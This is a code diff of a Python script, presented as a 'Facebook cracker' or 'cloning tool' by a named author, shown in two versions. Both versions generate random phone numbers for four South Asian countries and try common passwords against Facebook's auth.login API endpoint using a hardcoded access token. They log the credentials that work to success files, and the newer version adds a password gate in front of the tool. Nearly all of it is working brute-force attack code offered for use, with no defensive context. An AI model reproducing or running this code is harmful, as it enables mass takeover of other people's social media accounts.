@@ -1,93 +1,134 @@
-#----------------------------[IMPORTS]----------------------------#
-import requests, json, os, sys, time, random, datetime, re, uuid
-import urllib3
-from concurrent.futures import ThreadPoolExecutor as ThreadPool
-from time import localtime as lt
-from rich import print as rprint
-from rich.panel import Panel
-from rich.console import Console
-import socket
+import os, sys, time, requests, random
+from datetime import datetime
+from time import sleep
 
-#----------------------------[COLOR SETTINGS]----------------------------#
-console = Console()
-A = '\x1b[1;97m'
-G = '\x1b[38;5;46m'
-R = '\x1b[38;5;196m'
-Y = '\033[1;33m'
-B = '\x1b[38;5;8m'
+#------------------[ PASSWORD PROTECTION ]------------------#
+password = "9774943"
 
-#----------------------------[TOOL INFO]----------------------------#
+def check_password():
+    os.system("clear")
+    print("\033[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+    print("\033[1;97m  WELCOME TO ABD UR RAB FACEBOOK CRACKER")
+    print("\033[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+    user_pass = input("\n\033[1;97mENTER PASSWORD: ")
+    if user_pass != password:
+        print("\n\033[1;91mWRONG PASSWORD! TRY AGAIN.\033[1;97m")
+        sleep(2)
+        check_password()
+    else:
+        print("\n\033[1;92mACCESS GRANTED! LOADING TOOL...\033[1;97m")
+        sleep(2)
+
+check_password()
+
+#------------------[ TOOL INFO ]------------------#
 def tool_info():
     os.system("clear")
-    ip = requests.get("https://api64.ipify.org?format=json").json()["ip"]
-    time_now = datetime.datetime.now().strftime("%H:%M:%S")
-    panel_text = f"""
-    [bold green]TOOL OWNER:[/] [cyan]Abd Ur Rab[/]
-    [bold green]STATUS:[/] [cyan]ACTIVE[/]
-    [bold green]VERSION:[/] [cyan]1.0[/]
-    [bold green]TIME:[/] [cyan]{time_now}[/]
-    [bold green]IP ADDRESS:[/] [cyan]{ip}[/]
-    """
-    rprint(Panel(panel_text, title="[bold red]ANONYMOUS TOOL[/]", subtitle="We Are Legion", style="bold magenta"))
+    print("\033[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+    print("\033[1;97m   FACEBOOK CLONING TOOL BY ABD UR RAB")
+    print("\033[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+    print("\033[1;97mTOOL VERSION    : \033[1;92mV1.0")
+    print("\033[1;97mTOOL OWNER      : \033[1;92mABD UR RAB")
+    print("\033[1;97mTOOL STATUS     : \033[1;92mACTIVE")
+    print("\033[1;97mCURRENT TIME    : \033[1;92m" + datetime.now().strftime("%H:%M:%S"))
+    print("\033[1;97mYOUR IP ADDRESS : \033[1;92m" + requests.get("https://api64.ipify.org").text)
+    print("\033[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+    sleep(3)
 
-#----------------------------[USER AGENT GENERATOR]----------------------------#
-def generate_ua():
-    return f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(99, 125)}.0.{random.randint(4500, 4999)}.{random.randint(75, 99)} Safari/537.36"
+tool_info()
 
-#----------------------------[NUMBER GENERATOR]----------------------------#
-def generate_numbers(country):
-    prefix = {
-        "1": "9230",   # Pakistan
-        "2": "9198",   # India
-        "3": "9370",   # Afghanistan
-        "4": "8801"    # Bangladesh
-    }
-    numbers = []
-    for _ in range(10000):
-        numbers.append(prefix[country] + str(random.randint(1000000, 9999999)))
-    return numbers
+#------------------[ COUNTRY SELECTION ]------------------#
+def country_selection():
+    os.system("clear")
+    print("\033[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+    print("\033[1;97m  SELECT YOUR COUNTRY")
+    print("\033[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+    print("\033[1;97m[1] PAKISTAN")
+    print("\033[1;97m[2] AFGHANISTAN")
+    print("\033[1;97m[3] INDIA")
+    print("\033[1;97m[4] BANGLADESH")
+    print("\033[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+    
+    choice = input("\n\033[1;97mSELECT COUNTRY: ")
+    
+    if choice == "1":
+        country = "PAKISTAN"
+        code = "92"
+    elif choice == "2":
+        country = "AFGHANISTAN"
+        code = "93"
+    elif choice == "3":
+        country = "INDIA"
+        code = "91"
+    elif choice == "4":
+        country = "BANGLADESH"
+        code = "880"
+    else:
+        print("\n\033[1;91mINVALID CHOICE! TRY AGAIN.\033[1;97m")
+        sleep(2)
+        country_selection()
+    
+    print(f"\n\033[1;92mYOU SELECTED: {country} ({code})\033[1;97m")
+    sleep(2)
+    return code
 
-#----------------------------[LOGIN FUNCTION]----------------------------#
-def login(uid, pw):
-    session = requests.Session()
+code = country_selection()
+
+#------------------[ RANDOM USER GENERATION ]------------------#
+def generate_users():
+    os.system("clear")
+    print("\033[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+    print("\033[1;97m  ENTER NUMBER OF IDS TO GENERATE")
+    print("\033[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+    
+    limit = input("\n\033[1;97mENTER LIMIT (e.g. 10000): ")
+    
     try:
-        headers = {
-            "user-agent": generate_ua(),
-            "content-type": "application/x-www-form-urlencoded"
-        }
-        url = f"https://b-api.facebook.com/method/auth.login?format=json&email={uid}&password={pw}&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32"
-        response = session.get(url, headers=headers).json()
-        
-        if "session_key" in response:
-            rprint(f"[bold green]SUCCESS:[/] {uid} | {pw}")
-            open("success.txt", "a").write(f"{uid}|{pw}\n")
-        elif "www.facebook.com" in response.get("error_msg", ""):
-            rprint(f"[bold yellow]CHECKPOINT:[/] {uid} | {pw}")
-            open("checkpoint.txt", "a").write(f"{uid}|{pw}\n")
-    except Exception as e:
-        pass
+        limit = int(limit)
+    except:
+        print("\n\033[1;91mINVALID INPUT! TRY AGAIN.\033[1;97m")
+        sleep(2)
+        generate_users()
+    
+    print("\n\033[1;92mGENERATING IDS... PLEASE WAIT.\033[1;97m")
+    sleep(3)
+    
+    user_list = []
+    for _ in range(limit):
+        user_list.append(code + str(random.randint(1000000000, 1999999999)))
+    
+    return user_list
 
-#----------------------------[MAIN FUNCTION]----------------------------#
-def main():
-    tool_info()
-    
-    print("\n[1] Pakistan")
-    print("[2] India")
-    print("[3] Afghanistan")
-    print("[4] Bangladesh")
-    country = input("\n[?] Choose Your Country: ")
-    
-    if country not in ["1", "2", "3", "4"]:
-        print("\n[!] Invalid Choice! Exiting...")
-        sys.exit()
-    
-    passwords = ["123456", "12345678", "password", "000000", "pakistan123"]
-    numbers = generate_numbers(country)
-    
-    with ThreadPool(max_workers=30) as executor:
-        for num in numbers:
-            for pw in passwords:
-                executor.submit(login, num, pw)
+user_list = generate_users()
 
-if __name__ == "__main__":
-    main()
+#------------------[ CRACK FACEBOOK IDS ]------------------#
+def facebook_crack():
+    os.system("clear")
+    print("\033[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+    print("\033[1;97m  STARTING FACEBOOK CLONING")
+    print("\033[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+    print(f"\033[1;97mTOTAL IDS: {len(user_list)}")
+    print("\033[1;97mMETHOD: B-API & MBASIC")
+    print("\033[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+    
+    success = []
+    
+    for user in user_list:
+        for password in ["123456", "12345678", "123456789", "password", "pakistan"]:
+            session = requests.Session()
+            headers = {
+                "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-G960F)",
+                "Accept-Language": "en-US,en;q=0.9",
+                "Content-Type": "application/x-www-form-urlencoded"
+            }
+            response = session.get(f"https://b-api.facebook.com/method/auth.login?email={user}&password={password}&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32", headers=headers).json()
+            
+            if "session_key" in response:
+                print(f"\n\033[1;92m[SUCCESS] {user} | {password}\033[1;97m")
+                success.append(f"{user} | {password}")
+                open("successful_ids.txt", "a").write(f"{user} | {password}\n")
+                break
+    
+    print("\n\033[1;92mCLONING COMPLETE! CHECK 'successful_ids.txt' FOR RESULTS.\033[1;97m")
+
+facebook_crack()
